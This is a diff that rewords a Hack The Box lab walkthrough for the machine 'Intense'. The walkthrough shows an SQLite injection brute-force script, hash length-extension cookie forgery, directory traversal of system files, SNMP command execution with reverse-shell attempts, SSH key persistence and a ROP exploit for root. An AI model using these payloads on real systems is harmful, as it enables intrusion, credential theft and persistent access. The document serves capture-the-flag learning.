@@ -6,14 +6,14 @@ points: 40
 rating: 4.4
 date: 2020-07-04
 avatar: assets/htb/intense.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Intense
 ---
+
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked things off by running nmap against `<YOUR_IP>`. My usual flags are: `-p-`, the shortcut that tells nmap to cover every port, `-sC` which is the same as `--script=default` and fires off nmap's default enumeration scripts at the target, `-sV` for service detection, and `-oA <name>` to write the results out under the filename `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
@@ -74,35 +74,35 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds
 ```
 
-My nmap scan showed that only ports 22 - SSH and 80 - HTTP were open. 
+The scan came back with just two open ports: 22 - SSH and 80 - HTTP. 
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-port80.png)
+![](assets/wu/intense/img-1.png)
 
-With so little to work with, I loaded the HTTP site hosted on port 80, and found a site that greeted me with a message with guest logon credentials.
+Since there wasn't much else, I opened the HTTP site on port 80 and was met by a page that handed me guest login credentials right up front.
 
 > Hello ! You can login with the username and password guest.
 
-The site also pointed out that it was open source, and had a link that let me download `src.zip` which contained the source code for the site.
+The page also advertised that the project was open source and offered a download link for `src.zip`, which held the website's source code.
 
 > This app is opensource !
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-guest-login.png)
+![](assets/wu/intense/img-2.png)
 
-After logging in with the guest credentials, there was a message that said:
+Once I logged in as guest, I was shown the following message:
 
 > One day, an old man said "there is no point using automated tools, better to craft his own".
 
-This appeared to be a hint that automated tools would not work to get whatever I needed from this site.
+I read this as a clue that automated tooling wouldn't get me what I needed from the site.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-message-submit.png)
+![](assets/wu/intense/img-3.png)
 
-On the `/submit` page I found an input box, and of course I had to see what kind of vulnerabilities it might have!  First I tried the basic `<script>alert('test')</script>` test, and got an interesting error right away.
+The `/submit` page contained an input field, which I naturally wanted to probe for bugs!  My first attempt was the classic `<script>alert('test')</script>` payload, and it immediately threw an interesting error.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-syntax-error.png)
+![](assets/wu/intense/img-4.png)
 
-While testing for XSS, I found that the input box seemed to hint at SQL injection vulnerability since it seemed to have problems with me using single quotes.  After testing this for a short time I decided to look into the code from the `src.zip` I downloaded from the main page to find out what kind of queries I might need to formulate.
+What started as XSS testing pointed instead toward SQL injection, because the field clearly choked on single quotes.  Rather than keep poking blindly, I decided to dig into the `src.zip` I'd grabbed from the home page so I could figure out the right queries to build.
 
 ### Source Code Review
 
@@ -165,31 +165,31 @@ app
 13 directories, 38 files
 ```
 
-The file `src.zip` contained source code templates for the website, in a folder called `app`.  The most interesting files were the python code files which ran the site using the Flask framework.
+Inside `src.zip` were the site's source templates, all sitting under an `app` folder.  The most useful pieces were the Python files that drive the site through the Flask framework.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-adminpy.png)
+![](assets/wu/intense/img-5.png)
 
-In the file `admin.py` I found a few new directory paths to check out. 
+`admin.py` revealed a couple of new directory paths worth investigating. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-admin.png)
+![](assets/wu/intense/img-6.png)
 
-The `/admin` page was forbidden, as expected.
+As I'd guessed, the `/admin` page returned a forbidden response.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-adminlog.png)
+![](assets/wu/intense/img-7.png)
 
-As noted in the code, the two `/admin/log` paths required POST rather than GET requests.  It looked like I would need an admin session token to get anything out of these sites.  
+The code showed that the two `/admin/log` paths expected POST requests instead of GET.  To get anything out of them I'd evidently need an admin session token.  
 
 ```http
 Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.7B6PiygW8lDO84yRQABGvGfw0ttyTDTwk0h+GEEFpgI=
 ```
 
-I checked out the request to the page in Burp and found that there was a cookie header, with a base64 encoded string value for the `auth` parameter.
+Inspecting the request in Burp, I noticed a cookie header whose `auth` parameter held a base64-encoded string.
 
 ```http
-Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;ì(òPÎó@
+Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;ì(òPÎó@
 ```
 
-I decoded the base64 and found the `auth` cookie contained the username, a hex secret, and some kind of binary garbage appended to the end of the string.  It looked like I needed a way to get the secret for a user `admin` \(from the source code\).
+Decoding the base64 revealed that the `auth` cookie held the username, a hex secret, and some trailing binary junk.  It seemed I'd need to obtain the secret for the `admin` user \(referenced in the source code\).
 
 ```python
 from flask import Flask, request, render_template, g, redirect, url_for,\
@@ -268,7 +268,7 @@ if __name__ == "__main__":
     app.run()
 ```
 
-The file `app.py` contained a few interesting methods.  It looked like `submitmessage` restricted the message submissions to less than 140 characters and also did some sort of "bad word" check to filter input.  Afterwards it would place the message in the database if it passed those checks.
+`app.py` held several methods worth noting.  The `submitmessage` route capped submissions at 140 characters and ran some kind of "bad word" filter on the input, then stored the message in the database if it cleared both checks.
 
 ```python
 from hashlib import sha256
@@ -327,7 +327,7 @@ def create_cookie(session):
     return b64encode(session) + b'.' + b64encode(cookie_sig)
 ```
 
-The code file `lwt.py` contained code for creating the session and the cookie.  It also contained the code which explained the garbage at the end of the string, it was a signature comprised of the sha256 digest of the rest of the `auth` string.
+`lwt.py` was responsible for building the session and the cookie.  It also explained the junk at the tail of the string: a signature made from the sha256 digest of the remainder of the `auth` value.
 
 ```python
 import lwt
@@ -433,50 +433,50 @@ def admin_list_log(logdir):
     return listdir(logdir)
 ```
 
-The final file `utils.py` also contained some interesting methods. The method `is_admin()` told me that the `admin` user has a role of `1` in the database, `get_user()` and `try_login()` gave me some example SQL queries to test, and `badword_in_str()` gives me a list of filtered words `["rand", "system", "exec", "date"]` to avoid using.  It looked like I would not be able to execute code directly with my SQL injection and would have to pull out the data I wanted instead.
+`utils.py` was the last file and held several useful methods too. `is_admin()` revealed that the `admin` user carries a role of `1` in the database, `get_user()` and `try_login()` handed me sample SQL queries to work from, and `badword_in_str()` listed the filtered words `["rand", "system", "exec", "date"]` I'd need to steer clear of.  It was clear I couldn't run code outright through the injection and would instead have to extract the data I was after.
 
 ### SQLite SQL Injection
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-sqli.png)
+![](assets/wu/intense/img-8.png)
 
-Using information from `utils.py` I crafted the query: `' AND select secret from users where username = admin and role =1`, but got another syntax error.  
+Drawing on `utils.py`, I built the query `' AND select secret from users where username = admin and role =1`, only to hit another syntax error.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-sqli-close.png)
+![](assets/wu/intense/img-9.png)
 
-`a') UNION SELECT password FROM users --` resulted in the error `no such column: password`. However, substituting 'password' with 'secret' made it so the message was submitted with no error messages.  From the source code I could see that the backend database was sqlite3, so I did some research into doing SQL injection on this type of database.  I found a few resources that helped explain what I was doing wrong.
+`a') UNION SELECT password FROM users --` produced the error `no such column: password`. Swapping 'password' for 'secret', though, let the message go through cleanly with no errors.  Because the source confirmed the backend was sqlite3, I read up on how SQL injection works against that database.  A handful of resources helped clear up my mistakes.
 
 * [https://stackoverflow.com/questions/62803167/how-to-make-the-sql-injection-on-insert-work-on-sqlite](https://stackoverflow.com/questions/62803167/how-to-make-the-sql-injection-on-insert-work-on-sqlite)
 * [https://stackoverflow.com/questions/15513854/sqlite3-warning-you-can-only-execute-one-statement-at-a-time](https://stackoverflow.com/questions/15513854/sqlite3-warning-you-can-only-execute-one-statement-at-a-time)
 
-Apparently the errors I received while inserting a semicolon were because I could only execute one query at a time. The first source above supplies a work-around for this problem from Stack Overflow.
+It turned out the errors on semicolons were due to only one query being allowed per statement. The first link above offers a Stack Overflow workaround for exactly that.
 
 > Ok so I've spent some time working on this and there is a way to make it work. You can interrogate sqlite on queries like: "SELECT CASE WHEN \(SELECT SUBSTRING\(password, 1, 1\)\) = 'a' THEN 1 END". You can write a simple python script that changes the 1 inside substring and the 'a' char. In this way you can pretty much bruteforce the output of the column. – RobertM Jul 16 at 19:11
 
-I seemed like I would have to brute force each character of the secret string. I did some more reading to see how to craft this type of SQL query since it was new to me.
+It looked like brute-forcing the secret one character at a time was the way to go. Since this query style was new to me, I read up further on how to construct it.
 
 * [https://www.sqlitetutorial.net/sqlite-case/](https://www.sqlitetutorial.net/sqlite-case/)
 
-I was encountering a problem with my output only matching a zero `'0'` for the secret until I searched for SQLite3 error-based injection and found a \(russian-language\) site that showed how to use MATCH to get this to work properly.  [https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search](https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search)
+My output kept matching only a zero `'0'` for the secret until I searched for SQLite3 error-based injection and turned up a \(russian-language\) page demonstrating how MATCH makes this work.  [https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search](https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-sqli-nomatch.png)
+![](assets/wu/intense/img-10.png)
 
-However I still encountered a problem, since it seemed as if I wasn't able to use the MATCH\(\) method in this context.
+There was still a snag, though, as the MATCH\(\) method didn't appear usable in this situation.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-sqli-substring.png)
+![](assets/wu/intense/img-11.png)
 
-I also made a mistake when typing in the method SUBSTR, and I got a bit frustrated with sending individual queries through the website so I moved on to Burp suite to optimize my query testing.  After awhile I finally worked out the kinks and got a working query.  
+I also fat-fingered the SUBSTR method, and the tedium of firing single queries through the website got to me, so I switched to Burp Suite to speed up my testing.  Eventually I ironed out the issues and landed on a working query.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-intruder-payload.png)
+![](assets/wu/intense/img-12.png)
 
-To test my theory I used Burp's Intruder to test a brute force of all alpha-numeric characters on the first character of the 'secret' string.
+To check the idea, I used Burp's Intruder to brute force the first character of the 'secret' string across all alpha-numeric characters.
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-intruder-test%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
 
-I set Intruder to only fuzz the single character at a time in my query.
+I configured Intruder to fuzz only one character of the query at a time.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-intruder-first-f.png)
+![](assets/wu/intense/img-14.png)
 
-After letting the fuzzer run, I found that the first character in the admin's secret was `'f'`.  This was the only request that received an HTTP 200 OK message.
+When the fuzzer finished, it showed the admin secret's first character was `'f'`, the lone request that returned an HTTP 200 OK.
 
 ### Using python to brute force
 
@@ -486,7 +486,7 @@ After letting the fuzzer run, I found that the first character in the admin's se
 64
 ```
 
-I used the cookie I already had to pull out the secret string `84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec` which was 64 characters long.  This let me know how many characters I needed to brute force for the admin secret. From this I used Python to write a brute force program to iterate through all 64 characters in the secret. The following sources helped me:
+Using the cookie I already held, I extracted the secret `84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec`, which came out to 64 characters.  That told me how many characters the admin secret would require. With that, I wrote a Python brute forcer to step through all 64 characters of the secret. The resources below helped:
 
 * To get all alpha-numeric chars: [https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters](https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters)
 * To print output dynamically on one line: [https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically](https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically)
@@ -526,7 +526,7 @@ print("Total runtime: ")
 print("--- %s seconds ---" % (time.time() - start_time))
 ```
 
-My finalized python script was fairly short, and mostly consisted of creating a request with the SQL injection query in it.  I then iterated over all printable ASCII characters for each of the 64 positions in the secret.  I also added a little timer to see how long it would take to brute force the whole secret.
+The finished script was pretty compact, mostly just assembling a request carrying the SQL injection payload.  It then looped through every printable ASCII character at each of the 64 positions of the secret.  I tacked on a small timer to measure how long brute-forcing the full secret would take.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
@@ -537,19 +537,19 @@ Total runtime:
 --- 48.5825309753418 seconds ---
 ```
 
-The whole brute force went pretty quickly!  From the timer I found that it took less than 50 seconds to go through the whole string.
+The brute force ran quite fast!  Per the timer, the entire string was recovered in under 50 seconds.
 
 ```text
 auth=username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;ÉBCJ±ØèÅÞ
-b¾nTÁu µí§
-sm`Æ
+b¾nTÁu µí§
+sm`Æ
 ```
 
-Next I crafted my new `auth` cookie, `base64`'d it, and got the result: `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
+I then assembled my new `auth` cookie, ran it through `base64`, and ended up with: `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-broke-site.png)
+![](assets/wu/intense/img-15.png)
 
-Using this cookie, however, broke the whole site and made it so no pages would load. I figured it had something to do with the unreadable signature characters that were appended to the end of the secret in the cookie.
+That cookie, however, broke the entire site so that no pages would render. I suspected it was tied to the unreadable signature bytes appended to the secret in the cookie.
 
 ```python
 def sign(msg):
@@ -583,7 +583,7 @@ def parse_session(cookie):
     return info
 ```
 
-I went back to the source code file `lwt.py` , which gave me the answer.  The data after the `;` was a signature created by running `sha256` on `secret + MSG`.
+Returning to the `lwt.py` source gave me the answer.  The portion after the `;` was a signature produced by running `sha256` over `secret + MSG`.
 
 ```python
 def create_cookie(session):
@@ -591,11 +591,9 @@ def create_cookie(session):
     return b64encode(session) + b'.' + b64encode(cookie_sig)
 ```
 
-In order to create the signature, I needed to run the `create_cookie()` method above to encode and sign the username and secret.
+To produce the signature, I'd have to use the `create_cookie()` method above to encode and sign the username and secret.
 
 [https://github.com/bwall/HashPump](https://github.com/bwall/HashPump)
-
-TODO: find out what happened to this script on import...should be below
 
 ```python
 
@@ -610,50 +608,50 @@ dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNj
 The final admin cookie was:
 
 ```text
-Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;.!uÃéàêzæ<YG¯ÛqíW]ü>¦beÜM h
+Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;.!uÃéàêzæ<YG¯ÛqíW]ü>¦beÜM h
 ```
 
-For some reason the `hashpumpy` module added the guest cookie to the admin cookie, then appended the signature of them both together.
+For whatever reason, `hashpumpy` tacked the guest cookie onto the admin cookie and then appended a signature over both combined.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-welcomeadmin.png)
+![](assets/wu/intense/img-16.png)
 
-However this mega-cookie worked and I was able to login to the `/admin` page successfully.  
+This oversized cookie nonetheless worked, and I logged into the `/admin` page without a hitch.  
 
 ## Initial Foothold
 
 ### Remote Code Execution \(Limited\)
 
-Back in the `admin.py` file it mentioned using the `logfile` and `logdir` properties on their respective directories, along with the POST method after logging in as admin.  This looked like a task for Burp Repeater.
+Back in `admin.py`, it referenced the `logfile` and `logdir` properties on their respective directories, used together with a POST request after authenticating as admin.  This screamed Burp Repeater.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-etcpasswd.png)
+![](assets/wu/intense/img-17.png)
 
-The `logfile` property was susceptible to directory traversal, and through Burp I was able to download `/etc/passwd`.  There were only two users that had the ability to login: `root` and `user`. I noticed an unusual user named `debian_snmp`, so I decided to see what I could find using the SNMP service. \(Another nmap scan revealed that UDP port 161 was open, which is the default SNMP port!\)
+The `logfile` property was vulnerable to directory traversal, and through Burp I pulled down `/etc/passwd`.  Only two users could actually log in: `root` and `user`. An odd account named `debian_snmp` caught my eye, so I figured I'd see what the SNMP service might offer. \(A follow-up nmap scan showed UDP port 161 open, which is the default SNMP port!\)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-snmpd-conf.png)
+![](assets/wu/intense/img-18.png)
 
-While looking at the SNMP configuration files, I found a read/write community string of `SuP3RPrivCom90` in `snmpd.conf`.
+Reviewing the SNMP config files, I spotted a read/write community string of `SuP3RPrivCom90` in `snmpd.conf`.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-ssh-conf.png)
+![](assets/wu/intense/img-19.png)
 
 ssh.conf - nothing useful
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-user-folder.png)
+![](assets/wu/intense/img-20.png)
 
-I also used the logdir property to enumerate the contents of `/home/user`.  This folder contained the file `user.txt`, so I knew I was on the right track.
+I also leveraged the logdir property to list the contents of `/home/user`.  That directory held `user.txt`, confirming I was headed the right way.
 
 ### User.txt
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-user-txt.png)
+![](assets/wu/intense/img-21.png)
 
-This was interesting...it isn't very often that I am able to get the user flag through web requests.
+This was a fun one...it's pretty rare that I grab the user flag purely over web requests.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-user-ssh.png)
+![](assets/wu/intense/img-22.png)
 
-I also checked for the presence of the `authorized_keys` file, since this is a great way to gain persistence.
+I also looked for an `authorized_keys` file, since it's an excellent route to persistence.
 
 ### Enumerating SNMP
 
-Next, I spend some time trying to find information on how to use that community string I had found to gain access to the machine.  I found a nice blog that showed me exactly what I needed to do to get a shell through SNMP.
+Next I spent some time figuring out how to turn the community string I'd found into access on the box.  A great blog walked me through exactly how to land a shell via SNMP.
 
 * [https://digi.ninja/blog/snmp\_to\_shell.php](https://digi.ninja/blog/snmp_to_shell.php)
 
@@ -755,7 +753,7 @@ NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
 NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 1
 ```
 
-Unfortunately the version of `nc` on the victim's computer did not have `-e` functionality, so I wasn't able to get it to send me a reverse shell.
+Unfortunately the `nc` build on the target lacked `-e` support, so I couldn't get it to fire a reverse shell back to me.
 
 ## Getting a shell
 
@@ -786,7 +784,7 @@ NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 Timeout: No Response from <YOUR_IP>
 ```
 
-I tried sending a reverse shell, but got an End-of-Line error
+I attempted a reverse shell but ran into an End-of-Line error
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
@@ -813,9 +811,7 @@ intense
 
 got a shell back on my waiting nc listener
 
-{% hint style="info" %}
-There was a strange problem I encountered with this SNMP shell...if I lost my shell I would lose the ability to connect back to this box. Not sure why or how, but it took two resets of my connection pack and my local machine to get it to work again. I thought I had lost all connection to HTB, but after it happened again a few days later I tried pinging a known active box \(I think I had accidentally tried pinging a box that is inactive, leading me to believe I lost my whole connection\).  After it happened again later I reset the machine itself and this fixed it...
-{% endhint %}
+I ran into an odd quirk with this SNMP shell...whenever I dropped my shell, I'd also lose the ability to reconnect to the box. I'm not sure of the cause, but it took two resets of both my connection pack and my local machine to get it working again. I initially thought I'd lost my whole HTB connection, but after it recurred days later I tried pinging a box I knew was live \(I think I'd accidentally pinged an inactive box earlier, which fooled me into thinking the whole connection was down\).  When it happened yet again, resetting the machine itself resolved it...
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -876,15 +872,13 @@ Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 10.10.15.100 - - [07/Nov/2020 18:26:00] "GET /user.txt HTTP/1.1" 200 -
 ```
 
-Downloaded a few interesting files from `user`'s home folder...then lost my shell again when I cancelled the http server \(right after I realized I should have put my ssh key there!\)
-
-TODO: Where is the note\_server.c code?
+Pulled a few interesting files out of `user`'s home directory...then dropped my shell again when I killed the http server \(just after realizing I should have dropped my ssh key there!\)
 
 ```text
 
 ```
 
-Analysis of the note\_server.c code showed me that the program was looking for a connection to `127.0.0.1` on port 5001.  
+Reading through the note\_server.c source told me the program was expecting a connection to `127.0.0.1` on port 5001.  
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
@@ -894,7 +888,7 @@ NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
 NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "/bin/echo ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbT4GbSUckWcD775fh2EvAIst9754Yn0+88VlmfbV9qXiCEUeCrHXiEFc1KYDYnx/3CEUgu8gby04mHtBdP6n8= kac0@kali >> ~/.ssh/authorized_keys"
 ```
 
-I tried echoing my ssh key to `user` but got a permission denied error, so I tried to see if I could do the same for the `Debian-snmp` user, and got partial success
+Trying to echo my ssh key into `user`'s account returned a permission denied error, so I tried the same trick for the `Debian-snmp` user and got partial success
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
@@ -929,14 +923,14 @@ Connection to <YOUR_IP> closed.
 └─$ ssh -i intense.key Debian-snmp@<YOUR_IP> "/bin/sh"
 ```
 
-I was successful in copying my key, but I wasn't able to login and get a shell. I tried a few bypass methods, but it seemed as if they had it locked down.
+The key copy succeeded, but I couldn't actually log in and get a shell. I tried a few bypass tricks, yet it appeared to be locked down tight.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
 └─$ ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@<YOUR_IP> -i intense.key
 ```
 
-Even though I couldn't login, I was still able to use SSH to create a tunnel to the machine without running any commands.  This came in handy later when I wanted to connect to a port that was only open on the local host.
+Even without a login, I could still use SSH to set up a tunnel into the machine without executing any commands.  That proved useful later when I needed to reach a port bound only to localhost.
 
 ```text
 Debian-snmp@intense:/home/user$ ps -u root
@@ -969,9 +963,7 @@ note-server was running as root
 
 ## Binary Exploitation
 
-{% hint style="info" %}
 note: had to get help with this, not good with binary exploitation - thank you to ippsec for his amazing walkthrough videos; also the official write-up for the final working script. For some reason I wasnt able to get gdb's breakpoints to work. It kept giving me an error when running after setting a break point on the write@plt address
-{% endhint %}
 
 ```text
 0x0000000000000d27 <+541>:   callq  0x900 <write@plt>
@@ -1074,8 +1066,6 @@ doRop(rop)
 
 p.interactive()
 ```
-
-Copied and cleaned up the code from the official writeup, then ran it TODO: explain what it does
 
 ### Root.txt
 
